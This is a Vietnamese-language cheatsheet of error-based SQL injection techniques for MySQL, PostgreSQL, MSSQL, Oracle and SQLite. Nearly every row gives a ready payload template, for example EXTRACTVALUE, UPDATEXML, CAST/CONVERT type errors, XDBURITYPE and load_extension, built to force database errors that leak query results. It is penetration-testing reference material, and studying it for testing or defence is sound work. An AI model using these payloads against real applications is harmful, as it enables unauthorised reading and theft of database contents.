# SQLi Error-Based Cheatsheet

## Table of Contents
- [MySQL](#mysql)
- [PostgreSQL](#postgresql)
- [MSSQL](#mssql)
- [Oracle](#oracle)
- [SQLite](#sqlite)

---

## MySQL

| Hàm / kỹ thuật | Cơ chế | Mẫu |
|---|---|---|
| `EXTRACTVALUE(xml, xpath)` | Tạo lỗi XPath để lỗi hiển thị dữ liệu | `EXTRACTVALUE(1, (<subquery>))` |
| `UPDATEXML(xml_target, xpath_expr, new_xml)` | Tạo lỗi XPath tương tự `EXTRACTVALUE()` | `UPDATEXML(1, (<subquery>), 1)` |
| `GTID_SUBSET(gtid_set1, gtid_set2)` | Đưa GTID sai định dạng để gây lỗi parse | `GTID_SUBSET((<subquery>), 1)` |
| `JSON_KEYS(json_doc)` | Đưa dữ liệu không hợp lệ vào ngữ cảnh JSON để gây lỗi parse | `JSON_KEYS((<subquery>))` |
| `NAME_CONST(name, value)` | Tạo tên cột trùng nhau để sinh lỗi duplicate column | `SELECT NAME_CONST((<subquery>),1), NAME_CONST((<subquery>),1)` |
| `FLOOR(RAND()) + GROUP BY` | Tạo giá trị group trùng để sinh lỗi duplicate entry | `SELECT COUNT(*), CONCAT('~',(<subquery>),'~',FLOOR(RAND(0)*2)) x FROM ... GROUP BY x` |
| `EXP(expr)` | Ép dữ liệu vào ngữ cảnh số học để gây lỗi cast hoặc overflow | `EXP(~(<subquery>))` |
| `UUID_TO_BIN(string_uuid)` | Đưa dữ liệu không đúng định dạng UUID để gây lỗi parse | `UUID_TO_BIN((<subquery>))` |

---

## PostgreSQL

| Hàm / kỹ thuật | Cơ chế | Mẫu |
|---|---|---|
| `CAST(expr AS type)` | Ép kiểu sai để gây lỗi conversion | `CAST((<subquery>) AS NUMERIC)` |
| `expr::type` | Viết tắt của `CAST`, cùng cơ chế lỗi ép kiểu | `(<subquery>)::NUMERIC` |
| `query_to_xml(...) + CAST` | Gom dữ liệu thành XML rồi ép kiểu để làm lỗi lộ dữ liệu | `CAST(query_to_xml('<query>',true,true,'') AS NUMERIC)` |
| `database_to_xml(...) + CAST` | Dump dữ liệu DB thành XML rồi ép kiểu để gây lỗi | `CAST(database_to_xml(true,true,'') AS NUMERIC)` |

---

## MSSQL

| Hàm / kỹ thuật | Cơ chế | Mẫu |
|---|---|---|
| `CONVERT(data_type, expression)` | Ép kiểu sai để gây lỗi conversion | `CONVERT(INT, (<subquery>))` |
| `CAST(expression AS data_type)` | Tương tự `CONVERT()`, gây lỗi ép kiểu | `CAST((<subquery>) AS INT)` |
| `IN (subquery / value list)` | So sánh khác kiểu dữ liệu để SQL Server tự ép kiểu và lỗi | `1337 IN (SELECT (<subquery>))` |
| `=` | So sánh số với chuỗi để sinh lỗi conversion | `1337 = (<subquery>)` |

---

## Oracle

| Hàm / kỹ thuật | Cơ chế | Mẫu |
|---|---|---|
| `UTL_INADDR.GET_HOST_NAME(ip_address)` | Đưa dữ liệu sai vào host lookup để gây lỗi hiện dữ liệu | `UTL_INADDR.GET_HOST_NAME((<subquery>))` |
| `CTXSYS.DRITHSX.SN(owner, text)` | Lợi dụng lỗi từ Oracle Text để lộ dữ liệu | `CTXSYS.DRITHSX.SN(USER, (<subquery>))` |
| `ORDSYS.ORD_DICOM.GETMAPPINGXPATH(input, arg1, arg2)` | Đưa dữ liệu vào ngữ cảnh XPath để gây lỗi parse | `ORDSYS.ORD_DICOM.GETMAPPINGXPATH((<subquery>), USER, USER)` |
| `CAST(expr AS type)` | Ép kiểu sai để gây lỗi conversion | `CAST((<subquery>) AS NUMBER)` |
| `XDBURITYPE(value).getBlob()` | Lợi dụng lỗi URI/XML DB để lộ dữ liệu | `XDBURITYPE((<subquery>)).getBlob()` |
| `XDBURITYPE(value).getClob()` | Tương tự `getBlob()`, nhưng ở ngữ cảnh CLOB | `XDBURITYPE((<subquery>)).getClob()` |
| `XMLType(expr)` | Tạo XML lỗi để sinh parse error | `XMLType((<subquery>))` |
| `DBMS_UTILITY.SQLID_TO_SQLHASH(value)` | Đưa dữ liệu sai định dạng để gây lỗi validation | `DBMS_UTILITY.SQLID_TO_SQLHASH((<subquery>))` |

---

## SQLite

| Hàm / kỹ thuật | Cơ chế | Mẫu |
|---|---|---|
| `load_extension(path)` | Dùng nhánh lỗi để tạo khác biệt đúng/sai | `CASE WHEN (<boolean_query>) THEN 1 ELSE load_extension(1) END` |

---

## Ghi nhớ nhanh

| DBMS | Cơ chế chính |
|---|---|
| MySQL | XPath error, parser error, duplicate error |
| PostgreSQL | Cast/type conversion error |
| MSSQL | Cast/conversion error, comparison-triggered conversion |
| Oracle | Package error, XML error, cast error |
| SQLite | Conditional error qua `load_extension()` |

